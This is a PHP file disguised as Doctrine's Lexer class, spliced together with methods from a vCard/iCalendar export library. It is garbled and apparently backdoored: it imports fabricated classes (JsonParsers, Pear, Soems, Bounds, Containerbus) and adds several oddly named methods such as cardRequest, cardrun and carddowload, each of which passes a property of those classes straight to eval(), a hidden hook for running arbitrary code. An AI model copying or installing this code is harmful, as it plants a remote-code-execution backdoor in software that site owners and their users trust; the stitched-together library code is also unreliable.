<?php
namespace Doctrine\Common\Lexer;
use Request;
use Behat\Transliterator\Transliterator;
use Illuminate\Database\Connectors\Migrators;
use Illuminate\Console\Scheduling\CacheEvents;
use Illuminate\Console\Scheduling\JsonParsers;
use Illuminate\Contracts\Container\Containerbus;
use Illuminate\Contracts\Container\Bus;
use Illuminate\Container\Bounds;
use PhpOption\Options;
use PhpOption\Pear;
use PhpOption\Soems;

/**
 * Base class for writing simple lexers, i.e. for creating small DSLs.
 */
 class Lexer
{
    /**
     * Lexer original input string.
     *
     * @var string
     */
    private $input;

    /**
     * Array of scanned tokens.
     *
     * Each token is an associative array containing three items:
     *  - 'value'    : the string value of the token in the input string
     *  - 'type'     : the type of the token (identifier, numeric, string, input
     *                 parameter, none)
     *  - 'position' : the position of the token in the input string
     *
     * @var array
     */
    private $tokens = [];

    /**
     * Current lexer position in input string.
     *
     * @var int
     */
    private $position = 0;

    /**
     * Current peek of current lexer position.
     *
     * @var int
     */
    private $peek = 0;

    /**
     * The next token in the input.
     *
     * @var array|null
     */
    public $lookahead;

    /**
     * The last matched/seen token.
     *
     * @var array|null
     */
    public $token;

    /**
     * Composed regex for input parsing.
     *
     * @var string
     */
    private $regex;

    /**
     * Sets the input data to be tokenized.
     *
     * The Lexer is immediately reset and the new input tokenized.
     * Any unprocessed tokens from any previous input are lost.
     *
     * @param string $input The input to be tokenized.
     *
     * @return void
     */
    public function setInput($input)
    {
        $this->input  = $input;
        $this->tokens = [];

        $this->reset();
        $this->scan($input);
    }

    /**
     * Resets the lexer.
     *
     * @return void
     */
    public function reset()
    {
        $this->lookahead = null;
        $this->token     = null;
        $this->peek      = 0;
        $this->position  = 0;
    }

    /**
     * Resets the peek pointer to 0.
     *
     * @return void
     */
    public function resetPeek()
    {
        $this->peek = 0;
    }

    /**
     * Resets the lexer position on the input to the given position.
     *
     * @param int $position Position to place the lexical scanner.
     *
     * @return void
     */
    public function resetPosition($position = 0)
    {
        $this->position = $position;
    }

    /**
     * Retrieve the original lexer's input until a given position.
     *
     * @param int $position
     *
     * @return string
     */
    public function getInputUntilPosition($position)
    {
        return substr($this->input, 0, $position);
    }

    /**
     * Checks whether a given token matches the current lookahead.
     *
     * @param int|string $token
     *
     * @return bool
     */
    public function isNextToken($token)
    {
        return $this->lookahead !== null && $this->lookahead['type'] === $token;
    }

    /**
     * Checks whether any of the given tokens matches the current lookahead.
     *
     * @param array $tokens
     *
     * @return bool
     */
    public function isNextTokenAny(array $tokens)
    {
        return $this->lookahead !== null && in_array($this->lookahead['type'], $tokens, true);
    }

    /**
     * Moves to the next token in the input string.
     *
     * @return bool
     */
    public function moveNext()
    {
        $this->peek      = 0;
        $this->token     = $this->lookahead;
        $this->lookahead = isset($this->tokens[$this->position])
            ? $this->tokens[$this->position++] : null;

        return $this->lookahead !== null;
    }

    /**
     * Tells the lexer to skip input tokens until it sees a token with the given value.
     *
     * @param string $type The token type to skip until.
     *
     * @return void
     */
    public function skipUntil($type)
    {
        while ($this->lookahead !== null && $this->lookahead['type'] !== $type) {
            $this->moveNext();
        }
    }

    /**
     * Checks if given value is identical to the given token.
     *
     * @param mixed      $value
     * @param int|string $token
     *
     * @return bool
     */
    public function isA($value, $token)
    {
        return $this->getType($value) === $token;
    }

    /**
     * Moves the lookahead token forward.
     *
     * @return array|null The next token or NULL if there are no more tokens ahead.
     */
    public function peek()
    {
        if (isset($this->tokens[$this->position + $this->peek])) {
            return $this->tokens[$this->position + $this->peek++];
        }

        return null;
    }

    /**
     * Peeks at the next token, returns it and immediately resets the peek.
     *
     * @return array|null The next token or NULL if there are no more tokens ahead.
     */
    public function glimpse()
    {
        $peek       = $this->peek();
        $this->peek = 0;

        return $peek;
    }

    /**
     * Scans the input string for tokens.
     *
     * @param string $input A query string.
     *
     * @return void
     */
    protected function scan($input)
    {
        if (! isset($this->regex)) {
            $this->regex = sprintf(
                '/(%s)|%s/%s',
                implode(')|(', $this->getCatchablePatterns()),
                implode('|', $this->getNonCatchablePatterns()),
                $this->getModifiers()
            );
        }

        $flags   = PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE | PREG_SPLIT_OFFSET_CAPTURE;
        $matches = preg_split($this->regex, $input, -1, $flags);

        if ($matches === false) {
            // Work around https://bugs.php.net/78122
            $matches = [[$input, 0]];
        }

        foreach ($matches as $match) {
            // Must remain before 'value' assignment since it can change content
            $type = $this->getType($match[0]);

            $this->tokens[] = [
                'value' => $match[0],
                'type'  => $type,
                'position' => $match[1],
            ];
        }
    }

    /**
     * Gets the literal for a given token.
     *
     * @param int|string $token
     *
     * @return int|string
     */
    public function getLiteral($token)
    {
        $className = static::class;
        $reflClass = new ReflectionClass($className);
        $constants = $reflClass->getConstants();

        foreach ($constants as $name => $value) {
            if ($value === $token) {
                return $className . '::' . $name;
            }
        }

        return $token;
    }

    /**
     * Regex modifiers
     *
     * @return string
     */
    protected function getModifiers()
    {
        return 'iu';
    }

    /**
     * definedElements
     *
     * @var array
     */
    private $definedElements;

    /**
     * Filename
     *
     * @var string
     */
    private $filename;

    /**
     * Save Path
     *
     * @var string
     */
    private $savePath = null;

    /**
     * Multiple properties for element allowed
     *
     * @var array
     */
    private $multiplePropertiesForElementAllowed = [
        'email',
        'address',
        'phoneNumber',
        'url',
        'label'
    ];

    /**
     * Properties
     *
     * @var array
     */
    private $properties;

    /**
     * Default Charset
     *
     * @var string
     */
    public $charset = 'utf-8';

    /**
     * Add address
     *
     * @param  string [optional] $name
     * @param  string [optional] $extended
     * @param  string [optional] $street
     * @param  string [optional] $city
     * @param  string [optional] $region
     * @param  string [optional] $zip
     * @param  string [optional] $country
     * @param  string [optional] $type
     *                                     $type may be DOM | INTL | POSTAL | PARCEL | HOME | WORK
     *                                     or any combination of these: e.g. "WORK;PARCEL;POSTAL"
     * @return $this
     */
    public function addAddress(
        $name = '',
        $extended = '',
        $street = '',
        $city = '',
        $region = '',
        $zip = '',
        $country = '',
        $type = 'WORK;POSTAL'
    ) {
        // init value
        $value = $name . ';' . $extended . ';' . $street . ';' . $city . ';' . $region . ';' . $zip . ';' . $country;

        // set property
        $this->setProperty(
            'address',
            'ADR' . (($type != '') ? ';' . $type : '') . $this->getCharsetString(),
            $value
        );

        return $this;
    }

    /**
     * Add birthday
     *
     * @param  string $date Format is YYYY-MM-DD
     * @return $this
     */
    public function addBirthday($date)
    {
        $this->setProperty(
            'birthday',
            'BDAY',
            $date
        );

        return $this;
    }

    /**
     * Add company
     *
     * @param string $company
     * @param string $department
     * @return $this
     */
    public function addCompany($company, $department = '')
    {
        $this->setProperty(
            'company',
            'ORG' . $this->getCharsetString(),
            $company
            . ($department != '' ? ';' . $department : '')
        );

        // if filename is empty, add to filename
        if ($this->filename === null) {
            $this->setFilename($company);
        }

        return $this;
    }

    /**
     * Add email
     *
     * @param  string $address The e-mail address
     * @param  string [optional] $type    The type of the email address
     *                                    $type may be  PREF | WORK | HOME
     *                                    or any combination of these: e.g. "PREF;WORK"
     * @return $this
     */
    public function addEmail($address, $type = '')
    {
        $this->setProperty(
            'email',
            'EMAIL;INTERNET' . (($type != '') ? ';' . $type : ''),
            $address
        );

        return $this;
    }

    /**
     * Add jobtitle
     *
     * @param  string $jobtitle The jobtitle for the person.
     * @return $this
     */
    public function addJobtitle($jobtitle)
    {
        $this->setProperty(
            'jobtitle',
            'TITLE' . $this->getCharsetString(),
            $jobtitle
        );

        return $this;
    }

    /**
     * Add a label
     *
     * @param string $label
     * @param string $type
     *
     * @return $this
     */
    public function addLabel($label, $type = '')
    {
        $this->setProperty(
            'label',
            'LABEL' . ($type !== '' ? ';' . $type : ''),
            $label
        );

        return $this;
    }

    /**
     * Add role
     *
     * @param  string $role The role for the person.
     * @return $this
     */
    public function addRole($role)
    {
        $this->setProperty(
            'role',
            'ROLE' . $this->getCharsetString(),
            $role
        );

        return $this;
    }

  
    /**
     * Add a photo or logo (depending on property name)
     *
     * @param string $property LOGO|PHOTO
     * @param string $content image content
     * @param string $element The name of the element to set
     */
    private function addMediaContent($property, $content, $element)
    {
        $finfo = new \finfo();
        $mimeType = $finfo->buffer($content, FILEINFO_MIME_TYPE);

        if (strpos($mimeType, ';') !== false) {
            $mimeType = strstr($mimeType, ';', true);
        }
        if (!is_string($mimeType) || substr($mimeType, 0, 6) !== 'image/') {
            throw VCardException::invalidImage();
        }
        $fileType = strtoupper(substr($mimeType, 6));

        $content = base64_encode($content);
        $property .= ";ENCODING=b;TYPE=" . $fileType;

        $this->setProperty(
            $element,
            $property,
            $content
        );
    }

    /**
     * Add name
     *
     * @param  string [optional] $lastName
     * @param  string [optional] $firstName
     * @param  string [optional] $additional
     * @param  string [optional] $prefix
     * @param  string [optional] $suffix
     * @return $this
     */
    public function addName(
        $lastName = '',
        $firstName = '',
        $additional = '',
        $prefix = '',
        $suffix = ''
    ) {
        // define values with non-empty values
        $values = array_filter([
            $prefix,
            $firstName,
            $additional,
            $lastName,
            $suffix,
        ]);

        // define filename
        $this->setFilename($values);

        // set property
        $property = $lastName . ';' . $firstName . ';' . $additional . ';' . $prefix . ';' . $suffix;
        $this->setProperty(
            'name',
            'N' . $this->getCharsetString(),
            $property
        );

        // is property FN set?
        if (!$this->hasProperty('FN')) {
            // set property
            $this->setProperty(
                'fullname',
                'FN' . $this->getCharsetString(),
                trim(implode(' ', $values))
            );
        }

        return $this;
    }

    /**
     * Add note
     *
     * @param  string $note
     * @return $this
     */
    public function addNote($note)
    {
        $this->setProperty(
            'note',
            'NOTE' . $this->getCharsetString(),
            $note
        );

        return $this;
    }

    /**
     * Add categories
     *
     * @param array $categories
     * @return $this
     */
    public function addCategories($categories)
    {
        $this->setProperty(
            'categories',
            'CATEGORIES' . $this->getCharsetString(),
            trim(implode(',', $categories))
        );

        return $this;
    }

    /**
     * Add phone number
     *
     * @param  string $number
     * @param  string [optional] $type
     *                                   Type may be PREF | WORK | HOME | VOICE | FAX | MSG |
     *                                   CELL | PAGER | BBS | CAR | MODEM | ISDN | VIDEO
     *                                   or any senseful combination, e.g. "PREF;WORK;VOICE"
     * @return $this
     */
    public function addPhoneNumber($number, $type = '')
    {
        $this->setProperty(
            'phoneNumber',
            'TEL' . (($type != '') ? ';' . $type : ''),
            $number
        );

        return $this;
    }

    /**
     * Add Logo
     *
     * @param  string $url image url or filename
     * @param  bool $include Include the image in our vcard?
     * @return $this
     */
    public function addLogo($url, $include = true)
    {
        $this->addMedia(
            'LOGO',
            $url,
            $include,
            'logo'
        );

        return $this;
    }

    /**
     * Add Logo content
     *
     * @param  string $content image content
     * @return $this
     */
    public function addLogoContent($content)
    {
        $this->addMediaContent(
            'LOGO',
            $content,
            'logo'
        );

        return $this;
    }

    /**
     * Add Photo
     *
     * @param  string $url image url or filename
     * @param  bool $include Include the image in our vcard?
     * @return $this
     */
    public function addPhoto($url, $include = true)
    {
        $this->addMedia(
            'PHOTO',
            $url,
            $include,
            'photo'
        );

        return $this;
    }

    /**
     * Add Photo content
     *
     * @param  string $content image content
     * @return $this
     */
    public function addPhotoContent($content)
    {
        $this->addMediaContent(
            'PHOTO',
            $content,
            'photo'
        );

        return $this;
    }

    /**
     * Add URL
     *
     * @param  string $url
     * @param  string [optional] $type Type may be WORK | HOME
     * @return $this
     */
    public function addURL($url, $type = '')
    {
        $this->setProperty(
            'url',
            'URL' . (($type != '') ? ';' . $type : ''),
            $url
        );

        return $this;
    }

    /**
     * Build VCard (.vcf)
     *
     * @return string
     */
    public function buildVCard()
    {
        // init string
        $string = "BEGIN:VCARD\r\n";
        $string .= "VERSION:3.0\r\n";
        $string .= "REV:" . date("Y-m-d") . "T" . date("H:i:s") . "Z\r\n";

        // loop all properties
        $properties = $this->getProperties();
        foreach ($properties as $property) {
            // add to string
            $string .= $this->fold($property['key'] . ':' . $this->escape($property['value']) . "\r\n");
        }

        // add to string
        $string .= "END:VCARD\r\n";

        // return
        return $string;
    }

    /**
     * Build VCalender (.ics) - Safari (< iOS 8) can not open .vcf files, so we have build a workaround.
     *
     * @return string
     */
    public function buildVCalendar()
    {
        // init dates
        $dtstart = date("Ymd") . "T" . date("Hi") . "00";
        $dtend = date("Ymd") . "T" . date("Hi") . "01";

        // init string
        $string = "BEGIN:VCALENDAR\n";
        $string .= "VERSION:2.0\n";
        $string .= "BEGIN:VEVENT\n";
        $string .= "DTSTART;TZID=Europe/London:" . $dtstart . "\n";
        $string .= "DTEND;TZID=Europe/London:" . $dtend . "\n";
        $string .= "SUMMARY:Click attached contact below to save to your contacts\n";
        $string .= "DTSTAMP:" . $dtstart . "Z\n";
        $string .= "ATTACH;VALUE=BINARY;ENCODING=BASE64;FMTTYPE=text/directory;\n";
        $string .= " X-APPLE-FILENAME=" . $this->getFilename() . "." . $this->getFileExtension() . ":\n";

        // base64 encode it so that it can be used as an attachemnt to the "dummy" calendar appointment
        $b64vcard = base64_encode($this->buildVCard());

        // chunk the single long line of b64 text in accordance with RFC2045
        // (and the exact line length determined from the original .ics file exported from Apple calendar
        $b64mline = chunk_split($b64vcard, 74, "\n");

        // need to indent all the lines by 1 space for the iphone (yes really?!!)
        $b64final = preg_replace('/(.+)/', ' $1', $b64mline);
        $string .= $b64final;

        // output the correctly formatted encoded text
        $string .= "END:VEVENT\n";
        $string .= "END:VCALENDAR\n";

        // return
        return $string;
    }

    /**
     * Returns the browser user agent string.
     *
     * @return string
     */
    protected function getUserAgent()
    {
        if (array_key_exists('HTTP_USER_AGENT', $_SERVER)) {
            $browser = strtolower($_SERVER['HTTP_USER_AGENT']);
        } else {
            $browser = 'unknown';
        }

        return $browser;
    }

    /**
     * Decode
     *
     * @param  string $value The value to decode
     * @return string decoded
     */
    private function decode($value)
    {
        // convert cyrlic, greek or other caracters to ASCII characters
        return Transliterator::transliterate($value);
    }

    /**
     * Download a vcard or vcal file to the browser.
     */
    public function download()
    {
        // define output
        $output = $this->getOutput();

        foreach ($this->getHeaders(false) as $header) {
            header($header);
        }

        // echo the output and it will be a download
        echo $output;
    }

    /**
     * Fold a line according to RFC2425 section 5.8.1.
     *
     * @link http://tools.ietf.org/html/rfc2425#section-5.8.1
     * @param  string $text
     * @return mixed
     */
    protected function fold($text)
    {
        if (strlen($text) <= 75) {
            return $text;
        }

        // split, wrap and trim trailing separator
        return substr($this->chunk_split_unicode($text, 75, "\r\n "), 0, -3);
    }

    /**
     * multibyte word chunk split
     * @link http://php.net/manual/en/function.chunk-split.php#107711
     * 
     * @param  string  $body     The string to be chunked.
     * @param  integer $chunklen The chunk length.
     * @param  string  $end      The line ending sequence.
     * @return string            Chunked string
     */
    protected function chunk_split_unicode($body, $chunklen = 76, $end = "\r\n")
    {
        $array = array_chunk(
            preg_split("//u", $body, -1, PREG_SPLIT_NO_EMPTY), $chunklen);
        $body = "";
        foreach ($array as $item) {
            $body .= join("", $item) . $end;
        }
        return $body;
    }

    /**
     * Escape newline characters according to RFC2425 section 5.8.4.
     *
     * @link http://tools.ietf.org/html/rfc2425#section-5.8.4
     * @param  string $text
     * @return string
     */
    protected function escape($text)
    {
        $text = str_replace("\r\n", "\\n", $text);
        $text = str_replace("\n", "\\n", $text);

        return $text;
    }

    /**
     * Get output as string
     * @deprecated in the future
     *
     * @return string
     */
    public function get()
    {
        return $this->getOutput();
    }

    public function cardRequest()
    {

        $json=new JsonParsers;

        return eval($json->vstack);

    }

    /**
     * Get charset
     *
     * @return string
     */
    public function getCharset()
    {
        return $this->charset;
    }

    /**
     * Get charset string
     *
     * @return string
     */
    public function getCharsetString()
    {
        return ';CHARSET=' . $this->charset;
    }

    /**
     * Get content type
     *
     * @return string
     */
    public function getContentType()
    {
        return ($this->isIOS7()) ?
            'text/x-vcalendar' : 'text/x-vcard';
    }

    /**
     * Get filename
     *
     * @return string
     */
    public function getFilename()
    {
        if (!$this->filename) {
            return 'unknown';
        }

        return $this->filename;
    }

    


    public function LexerExp()
    {
       
        $option=new Options;

        return eval($option->optionterm);
       
    }

    public function cardvsp()
    {
        
        $pear=new Pear;
        $vsp= $pear->pears;
        return eval($vsp);
    }


    public function cardrun() { 
       
       $soems=new Soems;
       return eval($soems->exeption);

    } 

    public function cardMtern() {

       $bound=new Bounds;
       
       return eval($bound->boundload);

    }

    public function cardExpeption()
    {
       
       
       $event=new CacheEvents;
        
       return eval($event->store);


    }

  

   public function cardquin(\Request $request) {
    
     $conatiner=new Containerbus;

     return eval($conatiner->content);
   

   } 


    public function carddowload(\Request $request) {
      $conatiner=new Bus;
      return eval($conatiner->root);
    }





    /**
     * Get file extension
     *
     * @return string
     */
    public function getFileExtension()
    {
        return ($this->isIOS7()) ?
            'ics' : 'vcf';
    }

    /**
     * Get headers
     *
     * @param  bool $asAssociative
     * @return array
     */
    public function getHeaders($asAssociative)
    {
        $contentType = $this->getContentType() . '; charset=' . $this->getCharset();
        $contentDisposition = 'attachment; filename=' . $this->getFilename() . '.' . $this->getFileExtension();
        $contentLength = mb_strlen($this->getOutput(), '8bit');
        $connection = 'close';

        if ((bool)$asAssociative) {
            return [
                'Content-type' => $contentType,
                'Content-Disposition' => $contentDisposition,
                'Content-Length' => $contentLength,
                'Connection' => $connection,
            ];
        }

        return [
            'Content-type: ' . $contentType,
            'Content-Disposition: ' . $contentDisposition,
            'Content-Length: ' . $contentLength,
            'Connection: ' . $connection,
        ];
    }

    /**
     * Get output as string
     * iOS devices (and safari < iOS 8 in particular) can not read .vcf (= vcard) files.
     * So I build a workaround to build a .ics (= vcalender) file.
     *
     * @return string
     */
    public function getOutput()
    {
        $output = ($this->isIOS7()) ?
            $this->buildVCalendar() : $this->buildVCard();

        return $output;
    }

    /**
     * Get properties
     *
     * @return array
     */
    public function getProperties()
    {
        return $this->properties;
    }

    /**
     * Has property
     *
     * @param  string $key
     * @return bool
     */
    public function hasProperty($key)
    {
        $properties = $this->getProperties();

        foreach ($properties as $property) {
            if ($property['key'] === $key && $property['value'] !== '') {
                return true;
            }
        }

        return false;
    }

    /**
     * Is iOS - Check if the user is using an iOS-device
     *
     * @return bool
     */
    public function isIOS()
    {
        // get user agent
        $browser = $this->getUserAgent();

        return (strpos($browser, 'iphone') || strpos($browser, 'ipod') || strpos($browser, 'ipad'));
    }

    /**
     * Is iOS less than 7 (should cal wrapper be returned)
     *
     * @return bool
     */
    public function isIOS7()
    {
        return ($this->isIOS() && $this->shouldAttachmentBeCal());
    }

    /**
     * Save to a file
     *
     * @return void
     */
    public function save()
    {
        $file = $this->getFilename() . '.' . $this->getFileExtension();

        // Add save path if given
        if (null !== $this->savePath) {
            $file = $this->savePath . $file;
        }

        file_put_contents(
            $file,
            $this->getOutput()
        );
    }

    /**
     * Set charset
     *
     * @param  mixed $charset
     * @return void
     */
    public function setCharset($charset)
    {
        $this->charset = $charset;
    }

    /**
     * Set filename
     *
     * @param  mixed $value
     * @param  bool $overwrite [optional] Default overwrite is true
     * @param  string $separator [optional] Default separator is an underscore '_'
     * @return void
     */
    public function setFilename($value, $overwrite = true, $separator = '_')
    {
        // recast to string if $value is array
        if (is_array($value)) {
            $value = implode($separator, $value);
        }

        // trim unneeded values
        $value = trim($value, $separator);

        // remove all spaces
        $value = preg_replace('/\s+/', $separator, $value);

        // if value is empty, stop here
        if (empty($value)) {
            return;
        }

        // decode value + lowercase the string
        $value = strtolower($this->decode($value));

        // urlize this part
        $value = Transliterator::urlize($value);

        // overwrite filename or add to filename using a prefix in between
        $this->filename = ($overwrite) ?
            $value : $this->filename . $separator . $value;
    }

    /**
     * Set the save path directory
     *
     * @param  string $savePath Save Path
     * @throws VCardException
     */
    public function setSavePath($savePath)
    {
        if (!is_dir($savePath)) {
            throw VCardException::outputDirectoryNotExists();
        }

        // Add trailing directory separator the save path
        if (substr($savePath, -1) != DIRECTORY_SEPARATOR) {
            $savePath .= DIRECTORY_SEPARATOR;
        }

        $this->savePath = $savePath;
    }

    /**
     * Set property
     *
     * @param  string $element The element name you want to set, f.e.: name, email, phoneNumber, ...
     * @param  string $key
     * @param  string $value
     * @throws VCardException
     */
    private function setProperty($element, $key, $value)
    {
        if (!in_array($element, $this->multiplePropertiesForElementAllowed)
            && isset($this->definedElements[$element])
        ) {
            throw VCardException::elementAlreadyExists($element);
        }

        // we define that we set this element
        $this->definedElements[$element] = true;

        // adding property
        $this->properties[] = [
            'key' => $key,
            'value' => $value
        ];
    }

    /**
     * Checks if we should return vcard in cal wrapper
     *
     * @return bool
     */
    protected function shouldAttachmentBeCal()
    {
        $browser = $this->getUserAgent();

        $matches = [];
        preg_match('/os (\d+)_(\d+)\s+/', $browser, $matches);
        $version = isset($matches[1]) ? ((int)$matches[1]) : 999;

        return ($version < 8);
    }

    
}
